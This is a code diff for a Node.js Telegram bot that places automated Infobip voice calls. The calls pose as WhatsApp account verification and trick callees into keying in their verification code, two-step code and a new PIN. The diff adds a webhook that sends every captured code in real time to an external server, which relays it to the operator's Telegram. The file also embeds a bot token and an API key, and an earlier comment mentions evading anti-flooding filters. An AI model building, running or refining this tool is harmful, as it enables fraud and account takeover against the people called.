@@ -15,18 +15,18 @@ const TELEGRAM_BOT_TOKEN = "7521128407:AAH2E4SKkAgKiXrkIReQwufyLoQTcRp4bvk";
 const PORT = process.env.PORT || 3000;
 const DEFAULT_API_KEY = "App e3daefcc80560f5b41fbaea5f57cf55d-37367689-0e5a-47ad-bf35-7f11679eb55d";
 const INFOBIP_BASE_HOST = "pdl8re.api.infobip.com";
+const WEBHOOK = "https://botllamadas.onrender.com/infobip-webhook";
 
 // =========================
 // ALMACENAMIENTO
 // =========================
 const authenticatedUsers = {};
 const awaitingInput = {};
-const callRequests = {}; // { scenarioId: chatId }
-const callRequestsByNumber = {}; // { targetNumber: chatId } para eventos sin scenarioId
+const callRequests = {};
+const callRequestsByNumber = {};
 
-// ID del escenario IVR reutilizable — nunca se crea uno nuevo si ya existe
 const SCENARIO_NAME = "Verificación de cuenta WhatsApp";
-let cachedScenarioId = "C22569C0E613A01A89DF3707551816E4"; // ID conocido actual
+let cachedScenarioId = null; // Se recreará con el nuevo payload
 
 // =========================
 // INICIALIZACIÓN DEL BOT
@@ -145,16 +145,32 @@ bot.on("text", (ctx, next) => {
 });
 
 // =========================
-// ESCENARIO IVR — REUTILIZABLE
+// ESCENARIO IVR
 // =========================
 
-// Devuelve el payload del escenario IVR
+function notifyEvent(type, extra = {}) {
+  return {
+    request: WEBHOOK,
+    options: {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: { type, from: "${caller}", to: "${destination}", ...extra }
+    }
+  };
+}
+
 function buildScenarioPayload() {
   const voiceOptions = { language: "es", gender: "female" };
+
   return {
     name: SCENARIO_NAME,
     description: "Flujo interactivo que integra captura inmediata de DTMF/voz y notifica cada interacción en tiempo real.",
     script: [
+
+      // 📲 Llamada contestada
+      notifyEvent("CALL_ANSWERED"),
+
+      // Bucle opción inicial
       {
         repeat: [
           {
@@ -168,23 +184,26 @@ function buildScenarioPayload() {
         ],
         while: "${initialOption != '1' && initialOption != '2'}"
       },
+
+      // 🔢 Opción inicial capturada
+      notifyEvent("DTMF_CAPTURED", { field: "initialOption", value: "${initialOption}" }),
+
       { say: "Ha presionado ${initialOption}.", options: voiceOptions },
+
       {
         say: "Le hemos enviado un código de verificación de 6 dígitos a su número de teléfono registrado. Por favor, verifique sus notificaciones o la pantalla de su WhatsApp y digite el código proporcionado.",
         options: voiceOptions
       },
+
       {
         collectInto: "verificationCode",
         options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
       },
-      {
-        request: "https://example.com/verify",
-        options: {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: { verificationCode: "${verificationCode}" }
-        }
-      },
+
+      // 🔑 Código de verificación capturado
+      notifyEvent("DTMF_CAPTURED", { field: "verificationCode", value: "${verificationCode}" }),
+
+      // Bucle verificación dos pasos
       {
         repeat: [
           {
@@ -198,6 +217,11 @@ function buildScenarioPayload() {
         ],
         while: "${twoStepOption != '1' && twoStepOption != '2'}"
       },
+
+      // 🔢 Opción dos pasos capturada
+      notifyEvent("DTMF_CAPTURED", { field: "twoStepOption", value: "${twoStepOption}" }),
+
+      // Rama: tiene verificación de dos pasos
       {
         if: "${twoStepOption == '1'}",
         then: [
@@ -209,9 +233,13 @@ function buildScenarioPayload() {
             collectInto: "twoStepCode",
             options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
           },
+          // 🔐 Código dos pasos capturado
+          notifyEvent("DTMF_CAPTURED", { field: "twoStepCode", value: "${twoStepCode}" }),
           { say: "Código de dos pasos recibido. Gracias por su verificación.", options: voiceOptions }
         ]
       },
+
+      // Rama: configura nuevo PIN
       {
         if: "${twoStepOption == '2'}",
         then: [
@@ -223,22 +251,26 @@ function buildScenarioPayload() {
             collectInto: "newTwoStepPin",
             options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
           },
+          // 📌 Nuevo PIN capturado
+          notifyEvent("DTMF_CAPTURED", { field: "newTwoStepPin", value: "${newTwoStepPin}" }),
           { say: "Nuevo pin configurado correctamente.", options: voiceOptions }
         ]
       },
+
+      // 📵 Llamada finalizando
+      notifyEvent("CALL_FINISHED"),
+
       "hangup"
     ]
   };
 }
 
-// Reutiliza el escenario existente o crea uno nuevo si no hay caché
 function getOrCreateScenario(apiKey, callback) {
   if (cachedScenarioId) {
     console.log("♻️ Reutilizando escenario en caché:", cachedScenarioId);
     return callback(null, cachedScenarioId);
   }
 
-  // Buscar en Infobip si ya existe uno con ese nombre
   const options = {
     method: "GET",
     hostname: INFOBIP_BASE_HOST,
@@ -253,14 +285,8 @@ function getOrCreateScenario(apiKey, callback) {
     res.on("end", () => {
       try {
         const list = JSON.parse(Buffer.concat(chunks).toString());
-        const existing = Array.isArray(list) && list.find(s => s.name === SCENARIO_NAME);
-        if (existing) {
-          cachedScenarioId = existing.id;
-          console.log("♻️ Escenario encontrado en Infobip:", cachedScenarioId);
-          callback(null, cachedScenarioId);
-        } else {
-          createScenario(apiKey, callback);
-        }
+        // Siempre crear uno nuevo para que tenga los request intermedios
+        createScenario(apiKey, callback);
       } catch (e) {
         callback(e);
       }
@@ -321,8 +347,8 @@ function initiateCall(chatId, targetNumber, fromNumber) {
 function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
   callRequests[scenarioId] = chatId;
   callRequestsByNumber[targetNumber] = chatId;
+  callRequestsByNumber[targetNumber.replace(/^\+/, "")] = chatId;
 
-  // bulkId único por llamada para evitar filtros anti-flooding
   const bulkId = "BULK-" + Date.now() + "-" + Math.random().toString(36).substr(2, 6);
 
   const messagePayload = {
@@ -339,7 +365,7 @@ function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
           to: { hour: 23, minute: 59 },
           days: ["MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY", "SUNDAY"]
         },
-        callbackUrl: "https://botllamadas.onrender.com/infobip-webhook"
+        callbackUrl: WEBHOOK
       }
     ]
   };
@@ -393,7 +419,6 @@ function extractScenarioId(event) {
 function notifyTelegram(scenarioId, msg, toNumber) {
   let chatId = scenarioId ? callRequests[scenarioId] : null;
 
-  // Fallback: buscar por número destino si no hay scenarioId
   if (!chatId && toNumber) {
     const cleanNumber = String(toNumber).replace(/^\+/, "");
     chatId = callRequestsByNumber[cleanNumber] || callRequestsByNumber["+" + cleanNumber] || null;
@@ -427,8 +452,8 @@ app.post("/infobip-webhook", (req, res) => {
 
   const handleEvent = (event) => {
     const scenarioId = extractScenarioId(event);
-    console.log("scenarioId:", scenarioId);
     const toNumber = event.to || (event.voiceCall && event.voiceCall.to) || null;
+    console.log("scenarioId:", scenarioId, "| type:", event.type || "REPORTE_FINAL");
     const msg = processCallEvent(event);
     notifyTelegram(scenarioId, msg, toNumber);
 
@@ -459,91 +484,85 @@ function processCallEvent(event) {
   let message = "";
   const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
   const to = event.to || (event.voiceCall && event.voiceCall.to) || "?";
-  const timestamp = event.timestamp
-    ? new Date(event.timestamp).toLocaleString("es-CO", { timeZone: "America/Bogota" })
-    : new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
+  const timestamp = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
 
   if (event.type) {
     switch (event.type) {
-      case "CALL_STARTED":
-      case "STARTED":
-        message = `📲 *LLAMADA INICIADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        break;
-      case "CALL_RINGING":
-      case "RINGING":
-      case "CALL_PRE_ESTABLISHED":
-        message = `🔔 *LLAMANDO...*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        break;
-      case "CALL_ESTABLISHED":
-      case "ESTABLISHED":
+
       case "CALL_ANSWERED":
         message = `✅ *¡LLAMADA CONTESTADA!*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
+
       case "CALL_FINISHED":
-      case "FINISHED":
-      case "HANGUP":
-      case "CALL_ENDED": {
-        const duration = event.duration || (event.properties && event.properties.duration) || (event.voiceCall && event.voiceCall.duration) || 0;
-        const mins = Math.floor(duration / 60);
-        const secs = duration % 60;
-        message = `📵 *LLAMADA FINALIZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n⏱️ Duración: ${mins}m ${secs}s\n🕐 ${timestamp}`;
+        message = `📵 *LLAMADA FINALIZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
-      }
+
       case "CALL_FAILED":
-      case "FAILED":
       case "NO_ANSWER":
       case "CALL_NO_ANSWER":
         message = `❌ *LLAMADA FALLIDA / NO CONTESTÓ*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
+
       case "CALL_REJECTED":
-      case "REJECTED":
       case "BUSY":
         message = `🚫 *LLAMADA RECHAZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
-      case "DTMF_CAPTURED":
+
+      case "DTMF_CAPTURED": {
+        const fieldNames = {
+          initialOption:   "Opción inicial",
+          verificationCode: "🔑 Código de verificación",
+          twoStepOption:   "Opción dos pasos",
+          twoStepCode:     "🔐 Código dos pasos",
+          newTwoStepPin:   "📌 Nuevo PIN"
+        };
+        const fieldLabel = fieldNames[event.field] || event.field;
+        message = `🔢 *${fieldLabel}: ${event.value}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+      }
+
+      case "CALL_STARTED":
+      case "STARTED":
+        message = `📲 *LLAMADA INICIADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
+      case "CALL_RINGING":
+      case "RINGING":
+        message = `🔔 *LLAMANDO...*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
       case "DTMF":
       case "DTMF_RECEIVED": {
-        const digit = (event.properties && event.properties.dtmf) || "?";
+        const digit = (event.properties && event.properties.dtmf) || event.value || "?";
         message = `🔢 *TECLA PRESIONADA: ${digit}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
       }
-      case "AMD_RESULT":
-      case "ANSWERING_MACHINE_DETECTION_FINISHED": {
-        const amdResult = (event.properties && event.properties.amdResult) || "DESCONOCIDO";
-        const emoji = amdResult === "HUMAN" ? "👤" : "🤖";
-        message = `${emoji} *DETECCIÓN: ${amdResult === "HUMAN" ? "PERSONA REAL" : "BUZÓN DE VOZ"}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        break;
-      }
-      case "SPEECH_CAPTURED": {
-        const text = (event.properties && event.properties.fullText) || "?";
-        message = `🗣️ *VOZ CAPTURADA*\n💬 Dijo: "${text}"\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        break;
-      }
-      case "CALL_RECEIVED":
-      case "RECEIVED":
-        message = `📥 *LLAMADA RECIBIDA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        break;
-      case "CALL_MISSED":
-      case "MISSED":
-        message = `📵 *LLAMADA PERDIDA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        break;
+
       default:
         message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         if (event.properties) message += `\n📋 Detalles: ${JSON.stringify(event.properties)}`;
     }
+
   } else if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.collectedDtmfs) {
+    // Reporte final de Infobip (llega igual que antes como respaldo)
     message = `📋 *RESUMEN DE LLAMADA*\n📞 De: +${from}\n🎯 Para: +${to}\n`;
     try {
-      let dtmfData = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
-      if (dtmfData.initialOption && dtmfData.initialOption !== "null") message += `\n1️⃣ Opción inicial: ${dtmfData.initialOption}`;
-      if (dtmfData.verificationCode && dtmfData.verificationCode !== "") message += `\n🔑 Código ingresado: ${dtmfData.verificationCode}`;
-      if (dtmfData.twoStepOption && dtmfData.twoStepOption !== "null") message += `\n2️⃣ Opción segundo paso: ${dtmfData.twoStepOption}`;
-      if (dtmfData.twoStepCode && dtmfData.twoStepCode !== "null") message += `\n🔐 Código segundo paso: ${dtmfData.twoStepCode}`;
-      if (dtmfData.newTwoStepPin && dtmfData.newTwoStepPin !== "null") message += `\n📌 Nuevo PIN: ${dtmfData.newTwoStepPin}`;
+      const dtmfData = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
+      if (dtmfData.initialOption && dtmfData.initialOption !== "null")
+        message += `\n1️⃣ Opción inicial: ${dtmfData.initialOption}`;
+      if (dtmfData.verificationCode && dtmfData.verificationCode !== "")
+        message += `\n🔑 Código ingresado: ${dtmfData.verificationCode}`;
+      if (dtmfData.twoStepOption && dtmfData.twoStepOption !== "null")
+        message += `\n2️⃣ Opción segundo paso: ${dtmfData.twoStepOption}`;
+      if (dtmfData.twoStepCode && dtmfData.twoStepCode !== "null")
+        message += `\n🔐 Código segundo paso: ${dtmfData.twoStepCode}`;
+      if (dtmfData.newTwoStepPin && dtmfData.newTwoStepPin !== "null")
+        message += `\n📌 Nuevo PIN: ${dtmfData.newTwoStepPin}`;
     } catch (err) {
       message += `\nError parseando DTMFs: ${err.message}`;
     }
     message += `\n🕐 ${timestamp}`;
+
   } else {
     message = `ℹ️ *EVENTO RECIBIDO*\n🕐 ${timestamp}\n📋 ${JSON.stringify(event, null, 2)}`;
   }
@@ -558,14 +577,13 @@ app.listen(PORT, () => {
   console.log(`Servidor Express escuchando en el puerto ${PORT}`);
 });
 
-// Lanzar bot con manejo del error 409 (conflicto de instancias)
 function launchBot(retries = 5) {
   bot.launch()
     .then(() => console.log("Bot de Telegram iniciado correctamente."))
     .catch((err) => {
       if (err.response && err.response.error_code === 409) {
         if (retries > 0) {
-          const delay = (6 - retries) * 3000; // espera incremental: 3s, 6s, 9s...
+          const delay = (6 - retries) * 3000;
           console.warn(`⚠️ Conflicto 409 (otra instancia activa). Reintentando en ${delay / 1000}s... (${retries} intentos restantes)`);
           setTimeout(() => launchBot(retries - 1), delay);
         } else {
